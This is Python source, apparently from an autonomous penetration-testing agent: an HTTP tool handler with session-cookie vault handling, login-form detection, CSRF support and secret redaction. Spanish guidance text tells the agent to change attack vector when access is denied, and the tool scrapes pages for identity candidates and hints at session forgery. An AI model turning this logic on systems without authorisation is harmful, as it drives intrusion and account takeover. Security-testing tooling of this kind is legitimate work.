    "La sesión NO autoriza este recurso: la respuesta trae 'access denied'/403 en "
    "el body aunque el status sea 200. No repitas el mismo session_ref sobre esta "
    "URL. Prueba el login de nuevo (POST al formulario, csrf_mode=true si lleva "
    "tokens) para obtener una sesión con el rol correcto y, si vuelve a denegar, "
    "cambia de vector: otra cuenta, otro parámetro o el servicio que quedó "
    "pendiente en el plan."
)


def serves_login_form(payload: dict[str, Any]) -> bool:
    """Whether the response body is a login form (never raises).

    The preview is what the model reads, so it is also what the tool can judge:
    a ``<input type="password">`` means the server did not let the request in.
    """
    body = str(payload.get("body_preview") or "")
    if not body:
        return False
    return bool(_PASSWORD_INPUT_RE.search(body))


async def _http_request_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Send one scoped HTTP(S) request through the sandbox and parse the result."""
    from nexus_core.kernel.schema_validation import validate

    validate(arguments, http_request_definition().input_schema)
    url = _validate_url(arguments.get("url"))
    method = str(arguments.get("method") or "GET").strip().upper()
    if method not in HTTP_ALLOWED_METHODS:
        raise ValueError(f"http method is not allowed: {method!r}")
    headers = _validate_headers(arguments.get("headers"))
    # A login leaves a cookie behind; without a way to send it back every later
    # request is anonymous no matter how well the credential was validated (Brute
    # It v7, iteration 22). ``session_ref`` is the vault handle the credential
    # tool returns, so the cookie value never has to enter the model's context.
    session_ref = str(arguments.get("session_ref") or "").strip()
    cookie_sent = ""
    if session_ref:
        from nexus_core.kernel.secret_store import default_secret_store, is_secret_ref

        if not is_secret_ref(session_ref):
            raise ValueError("session_ref must be a vault:<hex> handle")
        try:
            cookie_sent = default_secret_store().get(
                session_ref, tenant_id=context.tenant_id
            ).decode("utf-8").strip()
        except KeyError:
            raise ValueError(f"unknown session_ref: {session_ref}") from None
    manual_cookie = str(arguments.get("cookie") or "").strip()
    if manual_cookie:
        if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in manual_cookie):
            raise ValueError("cookie contains control characters")
        cookie_sent = "; ".join(part for part in (cookie_sent, manual_cookie) if part)
    if cookie_sent:
        headers = {key: value for key, value in headers.items() if key.lower() != "cookie"}
        headers["Cookie"] = cookie_sent

    data = arguments.get("data")
    data_b64 = arguments.get("data_base64")
    if data is not None and data_b64:
        raise ValueError("pass either 'data' or 'data_base64', not both")
    if data is not None:
        encoded_data = base64.b64encode(str(data).encode("utf-8")).decode("ascii")
    else:
        encoded_data = str(data_b64 or "")
        if encoded_data:
            try:
                base64.b64decode(encoded_data, validate=True)
            except Exception as exc:  # noqa: BLE001 - normalise to a ValueError
                raise ValueError(f"data_base64 is not valid base64: {exc}") from None

    root = workspace_root()
    upload = _build_upload_spec(arguments["upload"], root) if arguments.get("upload") else None
    save_path = _resolve_save_path(arguments.get("save_path"), root)

    requested_max = arguments.get("max_response_bytes")
    max_bytes = min(
        HTTP_MAX_RESPONSE_BYTES,
        max(1, int(requested_max) if requested_max else HTTP_DEFAULT_MAX_RESPONSE_BYTES),
    )
    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        HTTP_MAX_TIMEOUT_SECONDS,
        max(5, int(requested_timeout) if requested_timeout else HTTP_DEFAULT_TIMEOUT_SECONDS),
    )
    follow = bool(arguments.get("follow_redirects", False))
    download_limit = int(arguments.get("max_download_bytes", 268435456))
    if not 1 <= download_limit <= 268435456:
        raise ValueError("max_download_bytes must be between 1 and 268435456")
    insecure = bool(arguments.get("insecure", False))
    csrf_mode = bool(arguments.get("csrf_mode", False))
    csrf_form_url = str(arguments.get("csrf_form_url") or "").strip()
    if csrf_form_url and not csrf_mode:
        raise ValueError("csrf_form_url requires csrf_mode=true")
    if csrf_form_url:
        csrf_form_url = _validate_url(csrf_form_url)

    argv = [
        "python3",
        "-c",
        HTTP_CLIENT_SCRIPT,
        method,
        url,
        json.dumps(headers),
        encoded_data,
        json.dumps(upload) if upload else "null",
        "1" if follow else "0",
        str(max_bytes),
        str(timeout_seconds),
        save_path,
        "1" if insecure else "0",
        str(download_limit),
    ]
    sandbox = sandbox_for_environment(root, allowed_programs=HTTP_ALLOWED_PROGRAMS)
    staging: tempfile.TemporaryDirectory[str] | None = None
    if save_path:
        parent = Path(save_path).parent
        parent.mkdir(parents=True, exist_ok=True)
        staging = tempfile.TemporaryDirectory(prefix=".http-download-", dir=parent)
    # Fixed trailing positions keep the client's argv contract stable even when
    # no download staging dir exists.
    argv.extend([
        staging.name if staging is not None else "",
        "1" if csrf_mode else "0",
        csrf_form_url,
    ])
    try:
        result = await run_in_sandbox(
            sandbox,
            argv,
            timeout_seconds=timeout_seconds,
            image_env="NEXUS_HTTP_IMAGE",
            default_image="python:3.12-alpine",
        )
    finally:
        # The sandbox has reaped the process before returning/cancelling. Clean
        # partial files even when SIGTERM/SIGKILL skipped the client's finally.
        if staging is not None:
            staging.cleanup()


    noise_level = "medium" if (upload or method not in {"GET", "HEAD"}) else "low"
    evidence: dict[str, Any] = {
        "url": url,
        "method": method,
        "host": urlsplit(url).hostname,
        "noise_level": noise_level,
        "follow_redirects": follow,
        "insecure": insecure,
        "upload": upload is not None,
        "save_path": save_path or None,
        "timeout_seconds": timeout_seconds,
        "max_response_bytes": max_bytes,
        "cookie_sent": bool(cookie_sent),
        "session_ref": session_ref or None,
        "csrf_mode": csrf_mode,
        "csrf_form_url": csrf_form_url or None,
    }
    if result.timed_out:
        return ToolResult(
            output={"error": "http request timed out", "url": url, "method": method},
            verified=False,
            verification_method="http_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    try:
        payload = _parse_last_json(result.stdout)
    except ValueError as exc:
        return ToolResult(
            output={"error": str(exc), "url": url, "method": method},
            verified=False,
            verification_method="http_parse_failed",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    ok = bool(payload.get("ok")) and result.exit_code == 0
    response_cookies = _cookie_pairs(payload.get("set_cookie"))
    # A ``session_ref`` that comes back with a login form did not authenticate:
    # the panel answered 200 because that is what a login page does. Reporting
    # it as success is the infinite loop measured in the Hijack V1 run
    # (iterations 18-35: the same 3 843 bytes of ``login.php`` read as "panel"),
    # and storing the cookie of a failed login poisons the vault handle.
    not_authenticated = ok and bool(session_ref) and serves_login_form(payload)
    # The verdict for a request that *did* carry a session: the panel (positive
    # marker) or an explicit denial. The verifier derives the ``access`` fact from
    # the same predicate (``nexus_core.kernel.fact_verification``), so the answer
    # the model reads and the fact the board records can never disagree.
    session_signal = ""
    session_denied = False
    if ok and not not_authenticated and (session_ref or manual_cookie):
        session_signal = authenticated_page_signal(
            payload.get("body_preview"), urlsplit(url).path or "/"
        )
        session_denied = not session_signal and access_denied_page(payload.get("body_preview"))
    # The response may have handed out a session (a login that worked). Keep it
    # in the vault and return the handle so the next call does not need the value.
    stored_session_ref = (
        _store_session(response_cookies, context, session_ref, cookie_sent)
        if ok and not not_authenticated
        else None
    )
    # ``evidence["session_ref"]`` keeps naming the handle this request *used*;
    # the new one is reported apart so a replay can tell them apart.
    issued_session_ref = (
        stored_session_ref
        if stored_session_ref and stored_session_ref != session_ref
        else None
    )
    evidence["session_ref_issued"] = issued_session_ref
    page_evidence: dict[str, Any] | None = None
    if ok:
        evidence.update(
            {
                "status": payload.get("status"),
                "content_type": payload.get("content_type"),
                "body_complete": payload.get("body_complete"),
            "body_bytes": payload.get("body_bytes"),
                "body_sha256": payload.get("body_sha256"),
                "preview_truncated": payload.get("preview_truncated"),
                "elapsed_ms": payload.get("elapsed_ms"),
                "set_cookie_count": len(payload.get("set_cookie") or ()),
            }
        )
        if upload:
            evidence["uploaded_bytes"] = (payload.get("uploaded") or {}).get("size")
        if save_path:
            evidence["saved_path"] = (payload.get("saved") or {}).get("path")
            evidence["saved_bytes"] = (payload.get("saved") or {}).get("bytes")
        if csrf_mode:
            csrf_payload = payload.get("csrf") or {}
            evidence["csrf_form_status"] = csrf_payload.get("status")
            evidence["csrf_fields"] = csrf_payload.get("fields") or []
        page_evidence = _page_evidence(payload, url)
        if page_evidence:
            evidence["emails_found"] = len(page_evidence.get("emails") or ())
            evidence["people_found"] = len(page_evidence.get("people") or ())
            evidence["links_found"] = len(page_evidence.get("links") or ())
        if session_signal:
            evidence["session_signal"] = session_signal
    else:
        evidence["error"] = payload.get("error")

    scheme = _session_scheme(response_cookies)
    if scheme is not None:
        evidence["session_scheme"] = scheme.get("scheme")
        evidence["session_scheme_cookie"] = scheme.get("cookie")
    output: dict[str, Any] = {
        "url": url,
        "method": payload.get("method", method),
        "status": payload.get("status"),
        "reason": payload.get("reason"),
        "headers": payload.get("headers") or {},
        "set_cookie": payload.get("set_cookie") or [],
        # Same values, parsed: what a follow-up call sends in ``cookie``.
        "response_cookies": response_cookies,
        "content_type": payload.get("content_type"),
        "body_complete": payload.get("body_complete"),
        "body_bytes": payload.get("body_bytes"),
        "body_sha256": payload.get("body_sha256"),
        "body_preview": payload.get("body_preview"),
        "preview_truncated": payload.get("preview_truncated"),
        "elapsed_ms": payload.get("elapsed_ms"),
        "uploaded": payload.get("uploaded"),
        "saved": payload.get("saved"),
        "csrf": payload.get("csrf"),
        "error": payload.get("error"),
        # Markup only: emails, people + roles, same-origin links, technology and
        # the derived identity candidates. Absent on a non-HTML response.
        "extracted": page_evidence,
        **({"session_scheme": scheme, "session_forge_hint": FORGEABLE_SESSION_HINT}
           if scheme is not None else {}),
    }
    # The empty-export case is annotated with the request URL (the payload's
    # ``url`` is the one the sandbox echoed back, which is the same string).
    output.update(_preview_module_annotation(url, payload))
    if page_evidence:
        steps = _identity_next_steps(page_evidence, url)
        if steps:
            output["next_steps"] = steps
    if issued_session_ref:
        # Handle for the session this response issued: pass it as
        # ``session_ref`` on the next call instead of the cookie value.
        output["session_ref"] = issued_session_ref
    if not_authenticated:
        # The system's verdict, not the model's reading of a 200.
        evidence["session_state"] = "not_authenticated"
        output["session_state"] = "not_authenticated"
        output["guidance"] = SESSION_NOT_AUTHENTICATED_GUIDANCE
    elif session_signal:
        evidence["session_state"] = "authenticated"
        output["session_state"] = "authenticated"
        output["guidance"] = SESSION_AUTHENTICATED_GUIDANCE
    elif session_denied:
        evidence["session_state"] = "denied"
        output["session_state"] = "denied"
        output["guidance"] = SESSION_DENIED_GUIDANCE
    return ToolResult(
        output=output,
        verified=ok and not not_authenticated and not session_denied,
        outcome="partial" if (not_authenticated or session_denied) else "",
        verification_method=(
            "http_session_not_authenticated"
            if not_authenticated
            else "http_session_denied" if session_denied
            else "http_response_received" if ok else "http_request_failed"
        ),
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


async def http_request_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Redact every known vault secret from the response before it is returned.

    A page can echo a password the engine proved earlier (a login form, a
    diagnostic page, a redirect with the credential in the query). The handler
    knows the engagement's verified credential facts, so it removes those values
    from the preview, the evidence and the raw stdout -the same boundary SSH
    already applies (V1-6/V1-46).
    """
    result = await _http_request_handler(arguments, context)
    return redact_result(result, secrets_for_redaction(context, arguments))


__all__ = [
    "HTTP_ALLOWED_METHODS",
    "HTTP_CLIENT_SCRIPT",
    "http_request_definition",
    "http_request_handler",
]
